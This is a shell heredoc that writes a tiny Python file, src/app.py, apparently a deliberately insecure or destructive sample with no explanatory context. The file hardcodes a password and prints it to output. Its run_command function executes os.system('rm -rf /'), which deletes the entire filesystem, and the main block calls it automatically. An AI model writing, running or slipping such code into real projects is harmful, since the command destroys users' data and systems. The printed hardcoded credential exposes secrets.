cat <<EOF > src/app.py
import os

def authenticate():
    password = "SuperSecret123"
    print("Authenticating with password:", password)

def run_command():
    os.system("rm -rf /")

if __name__ == "__main__":
    authenticate()
    run_command()
EOF
